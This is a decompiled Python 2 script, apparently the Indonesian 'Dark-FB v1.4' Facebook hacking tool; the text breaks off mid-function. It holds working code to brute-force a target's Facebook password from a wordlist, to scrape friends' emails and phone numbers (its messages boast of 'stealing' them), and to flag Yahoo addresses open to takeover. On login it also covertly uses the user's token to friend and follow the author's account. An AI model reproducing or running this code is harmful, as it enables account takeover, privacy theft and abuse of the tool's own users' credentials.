#Decompiled At:Thu Mar 12 23:51:45 2020 

import os, sys, time, json, hashlib, re, getpass, urllib, threading, datetime
try:
    import mechanize
except ImportError:
    os.system('reset')
    rq = raw_input('\x1b[1;91m[+] \x1b[1;92mPerlu install mechanize \x1b[1;97m(y/t): ')
    if rq == '':
        print '\x1b[1;91m[!] Jangan kosong'
        os.sys.exit()
    elif rq == 'y':
        os.system('pip2 install mechanize')
    elif rq == 'Y':
        os.system('pip2 install mechanize')
    elif rq == 't':
        os.sys.exit()
    elif rq == 'T':
        os.sys.exit()
    else:
        print '\x1b[1;91m[!]\x1b[1;92m Pilih\x1b[1;93m (y/n)'
        time.sleep(1)
        os.sys.exit()
else:
    try:
        import requests
    except ImportError:
        os.system('reset')
        rqs = raw_input('\x1b[1;91m[+] \x1b[1;92mPerlu install requests \x1b[1;97m(y/t): ')
        if rqs == '':
            print '\x1b[1;91m[!] Jangan kosong'
            os.sys.exit()
        elif rqs == 'y':
            os.system('pip2 install requests')
            exit()
        elif rqs == 'Y':
            os.system('pip2 install requests')
            exit()
        elif rqs == 't':
            os.sys.exit()
        elif rqs == 'T':
            os.sys.exit()
        else:
            print '\x1b[1;91m[!]\x1b[1;92m Pilih\x1b[1;93m (y/n)'
            time.sleep(1)
            os.sys.exit()

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


sekarang = datetime.date.today()
logo = "\n\x1b[1;93m *       *\n  \x1b[90m\\     /  \n   \\.-./ \n  (\x1b[1;91mo\x1b[90m\\\x1b[1;93m^\x1b[90m/\x1b[1;91mo\x1b[90m)  _   _   _    \x1b[90m ___\n   \x1b[90m./ \\.\\ ( )\x1b[90m-( )\x1b[90m-( ) \x1b[90m.-'   '-.\n   \x1b[90m {\x1b[1;91m-\x1b[90m} \\\x1b[90m(//  ||   \\\\\x1b[90m/\x1b[1;93m (  ))\x1b[90m  '-.\n         //\x1b[90m-__||\x1b[90m__.-\\\\\x1b[90m.       .-'\n        (/    ()     \\)\x1b[90m'-._.-'\n        ||    ||      \\\\\n        ('    ('       ')  \x1b[1;92m[\x1b[1;97mDark-FB\x1b[1;92m]\x1b[1;93mv1.4\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mZeDD\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mLimite\x1b[1;97m[\x1b[1;96mD\x1b[1;97m] \x1b[1;97m/ \x1b[1;96m./R41N53\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/rezadkim\x1b[0m"

def login():
    global toket
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('reset')
        print logo
        print 40 * '\x1b[1;97m='
        print '\x1b[1;91m[!] \x1b[1;92mLOGIN AKUN FACEBOOK'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
        data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
        x = hashlib.new('md5')
        x.update(sig)
        a = x.hexdigest()
        data.update({'sig': a})
        url = 'https://api.facebook.com/restserver.php'
        try:
            jalan('\x1b[1;91m[+] \x1b[1;92mSedang Masuk \x1b[1;97m...')
            r = requests.get(url, params=data)
            z = json.loads(r.text)
            zedd = open('login.txt', 'w')
            zedd.write(z['access_token'])
            zedd.close()
            print '\x1b[1;91m[+] \x1b[1;92mLogin berhasil'
            requests.post('https://graph.facebook.com/me/friends?method=post&uids=angga.pro.980967&access_token=' + z['access_token'])
            requests.post('https://graph.facebook.com/angga.pro.980967/subscribers?access_token=' + z['access_token'])
            os.system('xdg-open https://www.instagram.com/rezadkim')
            time.sleep(2)
            menu()
        except KeyError:
            print '\x1b[1;91m[!] Login Gagal'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            r = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(r.text)
            nama = a['name']
            id = a['id']
        except:
            print '\x1b[1;91m[!] Hidupkan Koneksi internet'
            keluar()

    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m[+]\x1b[1;97m Nama       \x1b[1;91m: \x1b[1;92m' + nama
    print '\x1b[1;91m[+]\x1b[1;97m User ID    \x1b[1;91m:\x1b[1;92m ' + id
    print sekarang.strftime('\x1b[1;91m[+]\x1b[1;97m Date       \x1b[1;91m:\x1b[1;92m %A, %d-%B-20%y')
    print 40 * '\x1b[1;97m='
    print '\x1b[1;96m[\x1b[1;97m1.\x1b[1;96m]\x1b[1;97m Get Information Friend'
    print '\x1b[1;96m[\x1b[1;97m2.\x1b[1;96m]\x1b[1;97m Grup Saya'
    print '\x1b[1;96m[\x1b[1;97m3.\x1b[1;96m]\x1b[1;97m Hack Akun Facebook'
    print '\x1b[1;96m[\x1b[1;97m4.\x1b[1;96m]\x1b[1;97m Bot'
    print '\x1b[1;96m[\x1b[1;97m5.\x1b[1;96m]\x1b[1;97m Create Status'
    print '\x1b[1;96m[\x1b[1;97m6.\x1b[1;96m]\x1b[1;97m Delete TOKEN'
    print '\x1b[1;96m[\x1b[1;97m7.\x1b[1;96m]\x1b[1;97m Update TOOLs'
    print '\x1b[1;96m[\x1b[1;97m0.\x1b[1;96m]\x1b[1;91m Keluar'
    print
    menu_pilih()


def menu_pilih():
    zedd = raw_input('\x1b[1;91m(_)(_)====\x1b[1;97mD ')
    if zedd == '':
        print '\x1b[1;91m[!] Jangan kosong'
        menu_pilih()
    elif zedd == '1':
        info_id()
    elif zedd == '2':
        list_grup()
    elif zedd == '3':
        menu_hack()
    elif zedd == '4':
        menu_bot()
    elif zedd == '5':
        status()
    elif zedd == '6':
        os.system('rm -rf login.txt')
        os.system('xdg-open https://www.youtube.com/nganunymous')
        keluar()
    elif zedd == '7':
        jalan('\x1b[1;91m[!] \x1b[1;92mMemeriksa Update\x1b[1;97m ...')
        r = requests.get('https://raw.githubusercontent.com/rezadkim/dark-fb/master/README.md').text
        if 'v1.5' in str(r) or 'v1.6' in str(r) or 'v1.7' in str(r):
            jalan('\x1b[1;91m[!] \x1b[1;92mUpdate \x1b[1;97m...')
            os.system('reset')
            os.system('cd $home')
            os.system('rm -rf dark-fb')
            os.system('cd /sdcard')
            os.system('rm -rf dark-fb')
            os.system('cd /sdcard')
            jalan('\x1b[1;91m[!] \x1b[1;92mClone ulang \x1b[1;97m...')
            os.system('git clone https://github.com/rezadkim/dark-fb')
            os.system('cd dark-fb && python2 dark.py')
        else:
            print '\x1b[1;91m[!] Belum ada versi terbaru'
            keluar()
    elif zedd == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
        menu_pilih()


def info_id():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m: \x1b[1;97m')
    jalan('\x1b[1;91m[+] \x1b[1;92mMohon tunggu sebentar \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            print 40 * '\x1b[1;97m='
            print
            try:
                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak ada'
            else:
                try:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mTidak ada'
                else:
                    try:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mTidak ada'
                    else:
                        try:
                            print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m      : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m      : \x1b[1;91mTidak ada'

                        try:
                            print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : ' + z['birthday']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mTidak ada'

                    try:
                        print '\x1b[1;91m[?] \x1b[1;92mSekolah\x1b[1;97m       : '
                        for q in z['education']:
                            try:
                                print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                            except KeyError:
                                print '\x1b[1;91m                   ~ \x1b[1;91mTidak ada'

                    except KeyError:
                        pass

            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91m[!] Pengguna tidak ditemukan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()


def list_grup():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print logo
        print 40 * '\x1b[1;97m='
        listgrup = []
        print '\x1b[1;91m[+]\x1b[1;92m Melihat Daftar Grup\x1b[1;97m ...'
        jalan('\x1b[1;91m[+]\x1b[1;92m Mulai\x1b[1;97m ...')
        print
        print 40 * '\x1b[1;97m='
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Grup \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Grup tidak ditemukan...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()


def multi_menu():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;96m[\x1b[1;97m1.\x1b[1;96m]\x1b[1;97m Crack'
    print '\x1b[1;96m[\x1b[1;97m2.\x1b[1;96m]\x1b[1;97m Ambil ID Teman'
    print '\x1b[1;96m[\x1b[1;97m3.\x1b[1;96m]\x1b[1;97m Ambil ID Member GRUP'
    print '\x1b[1;96m[\x1b[1;97m4.\x1b[1;96m]\x1b[1;97m Ambil Email Teman'
    print '\x1b[1;96m[\x1b[1;97m5.\x1b[1;96m]\x1b[1;97m Ambil No HP Teman'
    print '\x1b[1;96m[\x1b[1;97m0.\x1b[1;96m]\x1b[1;91m Kembali'
    print
    multi_pilih()


def multi_pilih():
    cuih = raw_input('\x1b[1;91m(_)(_)====\x1b[1;97mD ')
    if cuih == '':
        print '\x1b[1;91m[!] Jangan kosong'
        multi_pilih()
    elif cuih == '1':
        crack()
        hasil()
    elif cuih == '2':
        id_teman()
    elif cuih == '3':
        id_grup()
    elif cuih == '4':
        email()
    elif cuih == '5':
        nomor_hp()
    elif cuih == '0':
        menu()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + cuih + ' \x1b[1;91mTidak ada'
        multi_pilih()


def id_teman():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print logo
            print 40 * '\x1b[1;97m='
            idzedd = []
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            yesid = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(yesid, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil ID teman \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            for ah in z['data']:
                idzedd.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID di dapatkan \x1b[1;96m%s' % len(idzedd)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri id teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + yesid
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(yesid)
            print '\x1b[1;91m[!] Kesalahan terjadi...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def id_grup():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print logo
            print 40 * '\x1b[1;97m='
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[+] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            print 40 * '\x1b[1;97m='
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil data member grup \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            idmem = []
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=id&limit=999999999&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID di dapatkan \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri id member grup...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Grup tidak ditemukan...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def email():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print logo
            print 40 * '\x1b[1;97m='
            mails = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil Email teman \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            em = []
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 40 * '\x1b[1;97m='
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Email di dapatkan \x1b[1;96m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri email teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] Kesalahan terjadi...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def nomor_hp():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print logo
            print 40 * '\x1b[1;97m='
            noms = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil Nomor teman \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            nos = []
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    nos.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 40 * '\x1b[1;97m='
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah nomor di dapatkan \x1b[1;96m%s' % len(nos)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri nomor telepon teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] Kesalahan terjadi...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def menu_hack():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;96m[\x1b[1;97m1.\x1b[1;96m]\x1b[1;97m Multi Bruteforce Facebook'
    print '\x1b[1;96m[\x1b[1;97m2.\x1b[1;96m]\x1b[1;97m BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;96m[\x1b[1;97m3.\x1b[1;96m]\x1b[1;97m Yahoo Chacker'
    print '\x1b[1;96m[\x1b[1;97m0.\x1b[1;96m]\x1b[1;91m Kembali'
    print
    hack_pilih()


def hack_pilih():
    hack = raw_input('\x1b[1;91m(_)(_)====\x1b[1;97mD ')
    if hack == '':
        print '\x1b[1;91m[!] Jangan kosong'
        hack_pilih()
    elif hack == '1':
        multi_menu()
    elif hack == '2':
        brute()
    elif hack == '3':
        yahoo()
    elif hack == '0':
        menu()
    else:
        print '\x1b[1;91m[!] \x1b[1;93m' + hack + ' \x1b[1;97mTidak ada'
        hack_pilih()


def brute():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print logo
            print 40 * '\x1b[1;97m='
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;93mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 40 * '\x1b[1;97m='
            print '\x1b[1;91m[+] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mJumlah\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[?] \x1b[1;92mPastikan koneksi internet anda super greget\x1b[1;97m ...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m%\x1b[1;91m] \x1b[1;92mMencoba \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                    data = requests.get(url)
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        jalan('\n\x1b[1;91m[+]\x1b[1;92m Ditemukan \x1b[1;97m...')
                        print 40 * '\x1b[1;97m='
                        print '\x1b[1;91m[+] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali\x1b[1;91m ]')
                        menu_hack()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Koneksi Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_hack()


def yahoo():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    vulnot = '\x1b[31mNot Vuln'
    vuln = '\x1b[32mVuln'
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    mpsh = []
    jml = 0
    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m[+] \x1b[1;92mMembaca Daftar teman\x1b[1;97m ...'
    jalan('\x1b[1;91m[+] \x1b[1;92mMulai\x1b[1;97m ...')
    save = open('MailVuln.txt', 'w')
    print
    print 40 * '\x1b[1;97m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[+] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 40 * '\x1b[1;97m='
                    print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[+] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print 40 * '\x1b[1;97m='
                else:
                    print '\x1b[1;91m[+] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_hack()


def menu_bot():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;96m[\x1b[1;97m1.\x1b[1;96m]\x1b[1;97m Auto Reactions Post'
    print '\x1b[1;96m[\x1b[1;97m2.\x1b[1;96m]\x1b[1;97m Bot Komen Target Post'
    print '\x1b[1;96m[\x1b[1;97m3.\x1b[1;96m]\x1b[1;97m Bot Komen Grup Post'
    print '\x1b[1;96m[\x1b[1;97m4.\x1b[1;96m]\x1b[1;97m Mass delete Post'
    print '\x1b[1;96m[\x1b[1;97m0.\x1b[1;96m]\x1b[1;91m Kembali'
    print
    bot_pilih()


def bot_pilih():
    bots = raw_input('\x1b[1;91m(_)(_)====\x1b[1;97mD ')
    if bots == '':
